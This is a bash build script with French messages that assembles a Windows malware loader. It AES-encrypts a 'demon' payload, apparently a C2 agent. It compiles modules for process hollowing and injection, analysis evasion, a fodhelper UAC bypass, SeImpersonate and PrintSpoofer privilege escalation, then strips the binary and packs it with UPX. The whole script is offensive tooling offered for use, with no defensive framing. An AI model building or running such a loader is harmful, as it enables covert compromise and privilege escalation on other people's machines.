#!/bin/bash
set -euo pipefail

# Clean mode
if [[ "${1:-}" == "--clean" || "${1:-}" == "-c" ]]; then
    echo ""
    echo "=================================================="
    echo "   CLEAN MODE"
    echo "=================================================="
    echo ""
    [[ -f "loader.exe" ]] && { rm -f "loader.exe"; echo "[*] Suppression: loader.exe"; }
    [[ -f "includes/demon.x64.h" ]] && { rm -f "includes/demon.x64.h"; echo "[*] Suppression: includes/demon.x64.h"; }
    [[ -d "obj" ]] && { rm -rf "obj"; echo "[*] Suppression: obj/"; }
    echo "[✓] Nettoyage terminé"
    exit 0
fi

echo ""
echo "=================================================="
echo "   AES Encryption - demon.x64.h"
echo "=================================================="
echo ""

INPUT_BIN="$1"
OUTPUT_EXE="loader.exe"
ARCH="${2:-x64}"

[[ $# -lt 1 ]] && { echo "usage: $0 demon.x64.bin [x64|x86]"; echo "       $0 --clean|-c (pour nettoyer)"; exit 1; }

# Create obj directory if needed
mkdir -p obj

# Cleanup
[[ -f "$OUTPUT_EXE" ]] && { rm -f "$OUTPUT_EXE"; echo "[*] Suppression: $OUTPUT_EXE"; } || echo "[*] $OUTPUT_EXE inexistant"
[[ -f "includes/demon.x64.h" ]] && { rm -f "includes/demon.x64.h"; echo "[*] Suppression: includes/demon.x64.h"; } || echo "[*] includes/demon.x64.h inexistant"
rm -f obj/*.o
echo "[*] Nettoyage: fichiers objet supprimés"

python3 myenc.py -i "$INPUT_BIN"
grep -q "fodhelper_enc" includes/demon.x64.h || { echo "❌ fodhelper_enc manquant"; exit 1; }

CC="x86_64-w64-mingw32-g++"
CC_C="x86_64-w64-mingw32-gcc"
STUB_DEFINE="-D_M_AMD64"
if [[ "$ARCH" == "x86" ]]; then
  CC="i686-w64-mingw32-g++"
  CC_C="i686-w64-mingw32-gcc"
  STUB_DEFINE="-D_X86_"
fi

# Compile RPC stubs (C file) - must be compiled with proper flags
echo "[*] Compiling RPC stubs..."
# MIDL output gates code on _M_AMD64, so define it for mingw-w64 x64
$CC_C -c -O2 -fPIC $STUB_DEFINE -Iincludes/rpc src/rpc/ms-rprn_c.c -o obj/printspoofer_rpc.o
# Provide MIDL alloc/bind helpers expected by generated stubs
$CC_C -c -O2 -fPIC -Iincludes/rpc src/rpc/rpc_helpers.c -o obj/rpc_helpers.o

# Compile all C++ files including RPC trigger
# NOTE: RPC object file must come AFTER the C++ files to resolve symbols properly
$CC -O2 -s -static -static-libgcc -static-libstdc++ \
  -Iincludes -Iincludes/crypto -Iincludes/injection -Iincludes/bypass -Iincludes/privesc -Iincludes/rpc \
  src/loader.cpp src/crypto/easCipher42.cpp src/crypto/crypto_funcs.cpp src/injection/process_hollower.cpp src/injection/process_injection.cpp src/bypass/bypass_analysis.cpp src/bypass/uac_bypass.cpp src/privesc/seimpersonate.cpp src/privesc/printspoofer_trigger.cpp \
  obj/printspoofer_rpc.o obj/rpc_helpers.o \
  -lbcrypt -lntdll -lole32 -lwinhttp -lrpcrt4 -luserenv -o "$OUTPUT_EXE"

strip "$OUTPUT_EXE" 2>/dev/null || true
upx --best "$OUTPUT_EXE" 2>/dev/null || true

echo "$(du -h "$OUTPUT_EXE" | cut -f1) ✅"
